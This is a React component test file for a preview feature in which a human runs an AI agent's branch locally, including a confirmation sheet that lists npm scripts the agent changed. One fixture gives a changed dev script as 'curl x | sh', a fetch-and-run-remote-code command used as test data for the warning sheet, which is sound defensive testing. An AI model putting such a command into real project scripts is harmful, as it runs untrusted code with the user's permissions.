import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, expect, test, vi } from "vitest";
import type { Preview } from "./bridge";

const b = vi.hoisted(() => ({ openLink: vi.fn(), previewList: vi.fn(), previewStart: vi.fn(), previewStop: vi.fn() }));
vi.mock("./bridge", () => b);

import { PreviewGroup, usePreviews } from "./Preview";

const flush = () => act(async () => {});
const P = (more: Partial<Preview> = {}): Preview => ({ team: "shop", role: "builder-1", project: "checkout", state: "running",
  command: "npm run dev", url: "http://localhost:5174", port: 5174, reason: "", output: "", fix: null, ...more });

const seeChanges = vi.fn();
function Harness() {
  const pv = usePreviews(1000, seeChanges);
  return <div className="review"><PreviewGroup team="shop" role="builder-1" pv={pv} />{pv.sheet}</div>;
}

beforeEach(() => {
  vi.useFakeTimers();
  vi.resetAllMocks();
  b.previewList.mockResolvedValue([]);
});
afterEach(() => {
  cleanup();
  vi.useRealTimers();
});

test("no command found: the sheet asks once, and the typed command starts it", async () => {
  b.previewStart.mockResolvedValueOnce({ team: "shop", role: "builder-1", project: "checkout", state: "needs_command" });
  b.previewStart.mockResolvedValueOnce(P({ state: "starting", url: null }));
  render(<Harness />);
  await flush();
  expect(screen.getByText("See builder-1's branch running before you merge it.")).toBeTruthy();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  expect(screen.getByRole("dialog", { name: "How does checkout start its dev server?" })).toBeTruthy();
  expect(screen.getByText(/couldn't find one in the project/)).toBeTruthy();
  fireEvent.change(screen.getByRole("textbox"), { target: { value: " python3 -m http.server $PORT " } });
  const starts = screen.getAllByRole("button", { name: "Start preview" });
  fireEvent.click(starts[starts.length - 1]);
  await flush();
  expect(b.previewStart).toHaveBeenLastCalledWith("shop", "builder-1", "python3 -m http.server $PORT", false, null);
  expect(screen.queryByRole("dialog")).toBeNull();
});

test("a preview started here opens once when it runs; Open preview opens it again and Stop stops it", async () => {
  b.previewStart.mockResolvedValue(P({ state: "starting", url: null }));
  b.previewList.mockResolvedValue([]);
  render(<Harness />);
  await flush();
  b.previewList.mockResolvedValue([P({ state: "starting", url: null })]);
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  expect(screen.getByText("npm run dev")).toBeTruthy();
  expect(b.openLink).not.toHaveBeenCalled();
  b.previewList.mockResolvedValue([P()]);
  await act(async () => { vi.advanceTimersByTime(1000); });
  await act(async () => { vi.advanceTimersByTime(1000); });
  expect(b.openLink).toHaveBeenCalledTimes(1);
  expect(screen.getByText("localhost:5174")).toBeTruthy();
  fireEvent.click(screen.getByRole("button", { name: "Open preview" }));
  expect(b.openLink).toHaveBeenCalledTimes(2);
  b.previewStop.mockResolvedValue({ stopped: true });
  fireEvent.click(screen.getByRole("button", { name: "Stop" }));
  await flush();
  expect(b.previewStop).toHaveBeenCalledWith("shop", "builder-1");
});

test("a preview that didn't start says why, shows its last lines, and names what Install and try again runs", async () => {
  b.previewList.mockResolvedValue([P({ state: "failed", url: null, fix: "install", install: "npm install",
    reason: "npm run dev stopped: vite isn't installed in builder-1's worktree.", output: "sh: vite: command not found" })]);
  b.previewStart.mockResolvedValue(P({ state: "starting", url: null }));
  render(<Harness />);
  await flush();
  expect(screen.getByText("The preview didn't start")).toBeTruthy();
  expect(screen.getByText("sh: vite: command not found")).toBeTruthy();
  expect(screen.getByText(/in builder-1's worktree, which downloads its packages/).textContent).toContain("Runs npm install");
  fireEvent.click(screen.getByRole("button", { name: "Install and try again" }));
  await flush();
  expect(b.previewStart).toHaveBeenCalledWith("shop", "builder-1", null, true, null);
  fireEvent.click(screen.getByRole("button", { name: "Change the start command" }));
  expect((screen.getByRole("textbox") as HTMLInputElement).value).toBe("npm run dev");
});

test("a refusal is shown, not swallowed", async () => {
  b.previewStart.mockRejectedValue(new Error("builder-1 has no branch to review."));
  render(<Harness />);
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  expect(screen.getByRole("alert").textContent).toContain("builder-1 has no branch to review.");
});

test("an agent's first preview shows every changed script it runs, links to the changes, and runs only on Run it", async () => {
  b.previewStart.mockResolvedValueOnce({ ...P({ state: "confirm", url: null }), install: "npm install", fingerprint: "f1",
    changed: ["postinstall", "dev"], steps: [
      { line: "npm install", scripts: [{ name: "postinstall", runs: "node scripts/setup.js", changed: true }] },
      { line: "npm run dev", scripts: [{ name: "dev", runs: "next dev --turbo", changed: true }] }] });
  b.previewStart.mockResolvedValueOnce(P({ state: "starting", url: null }));
  render(<Harness />);
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  const sheet = screen.getByRole("dialog", { name: "Run builder-1's preview?" });
  expect(sheet.textContent).toContain("with your permissions, not the agent's");
  expect(sheet.querySelector(".preview-steps")!.textContent).toBe(
    "npm install" + "postinstall, changed on this branch:" + "node scripts/setup.js" +
    "npm run dev" + "dev, changed on this branch:" + "next dev --turbo");
  expect(sheet.textContent).toContain("builder-1 changed the postinstall and dev scripts on its branch. Read them before you run them.");
  expect(sheet.textContent).toContain("npm install comes first");
  expect(document.activeElement).not.toBe(screen.getByRole("button", { name: "Run it" })); // read first
  fireEvent.click(screen.getByRole("button", { name: "Run it" }));
  await flush();
  expect(b.previewStart).toHaveBeenLastCalledWith("shop", "builder-1", null, false, "f1");
  expect(screen.queryByRole("dialog")).toBeNull();
});

test("See the changes opens that agent's Review and runs nothing", async () => {
  b.previewStart.mockResolvedValueOnce({ ...P({ state: "confirm", url: null }), fingerprint: "f1", changed: ["dev"],
    steps: [{ line: "npm run dev", scripts: [{ name: "dev", runs: "curl x | sh", changed: true }] }] });
  render(<Harness />);
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "See the changes" }));
  expect(seeChanges).toHaveBeenCalledWith("shop", "builder-1");
  expect(screen.queryByRole("dialog")).toBeNull();
  expect(b.previewStart).toHaveBeenCalledTimes(1);
});

test("with nothing changed, Run it has the focus and the main script is shown", async () => {
  b.previewStart.mockResolvedValueOnce({ ...P({ state: "confirm", url: null }), fingerprint: "f1", changed: [],
    steps: [{ line: "npm run dev", scripts: [{ name: "dev", runs: "vite", changed: false }] }] });
  render(<Harness />);
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  expect(screen.getByRole("dialog").querySelector(".preview-steps")!.textContent).toBe("npm run devdev:vite");
  expect(document.activeElement).toBe(screen.getByRole("button", { name: "Run it" }));
});

test("Cancel runs nothing", async () => {
  b.previewStart.mockResolvedValueOnce({ ...P({ state: "confirm", url: null }), changed: [], fingerprint: "f1",
    steps: [{ line: "npm run dev", scripts: [] }] });
  render(<Harness />);
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Start preview" }));
  await flush();
  fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
  expect(screen.queryByRole("dialog")).toBeNull();
  expect(b.previewStart).toHaveBeenCalledTimes(1);
});

test("screens share one poller, and it rests while the window is hidden", async () => {
  render(<><Harness /><Harness /><Harness /></>);
  await flush();
  expect(b.previewList).toHaveBeenCalledTimes(1);
  await act(async () => { vi.advanceTimersByTime(1000); });
  expect(b.previewList).toHaveBeenCalledTimes(2);
  const hidden = vi.spyOn(document, "hidden", "get").mockReturnValue(true);
  await act(async () => { vi.advanceTimersByTime(5000); });
  expect(b.previewList).toHaveBeenCalledTimes(2); // nothing while hidden
  hidden.mockReturnValue(false);
  await act(async () => { document.dispatchEvent(new Event("visibilitychange")); });
  expect(b.previewList).toHaveBeenCalledTimes(3);
  hidden.mockRestore();
});
